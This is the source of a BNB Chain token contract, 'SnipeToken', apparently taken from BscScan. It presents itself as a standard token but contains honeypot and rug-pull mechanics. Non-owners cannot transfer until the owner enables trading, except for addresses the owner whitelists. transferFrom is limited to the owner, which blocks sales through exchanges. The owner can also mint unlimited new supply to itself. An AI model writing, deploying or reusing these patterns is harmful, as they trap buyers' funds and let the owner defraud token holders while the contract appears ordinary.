/**
 *Submitted for verification at BscScan.com on 2021-07-19
*/

/**
 *Submitted for verification at BscScan.com on 2021-07-18
*/

/*"SPDX-License-Identifier: Unlicensced"*/

pragma solidity 0.8.4;

contract SnipeToken {
    
    string  public name; //= "WENRUG LIFETIME License";
    string  public symbol; // = "WENRUG-Lifetime";
    uint256 public totalSupply; // = 100000000000000; // 1 million token
    uint8   public decimals; // = 9;
    bool isEnabled = false;
    address owner;
    event Error(string error);
    
     modifier onlyOwner() {
        require(msg.sender == owner);
        _;
}
    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 _value
    );

    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) allowspending;
    constructor(string memory _name,string memory _symbol,uint256 _supply,uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _supply*10**decimals;
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    function setTokenStatus(bool _status) onlyOwner public {
        isEnabled = _status;
}
    
    function allowspendingaddress(address _to,bool _value) onlyOwner public {
            allowspending[_to] = _value;
    }
    
    function getallowancedata(address _addy) public view returns(bool){
        bool __value = allowspending[_addy];
        return __value;
    }
    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        if (msg.sender != owner){
            if (allowspending[msg.sender] != true){
            require(isEnabled);
            }
        }
        require(balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function initializeSupply(uint256 amount) public onlyOwner {
    totalSupply = totalSupply+(amount*10**decimals);
    balanceOf[owner] = balanceOf[owner]+amount*10**decimals;
    emit Transfer(address(0), owner, amount*10**decimals);
  }
  
    

    function transferFrom(address _from, address _to, uint256 _value) onlyOwner public returns (bool success) {
        require(_value <= balanceOf[_from]);
        require(_value <= allowance[_from][msg.sender]);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }
    
    function setOwner(address newOwner) onlyOwner external {
     owner = newOwner;
  }
  
    
}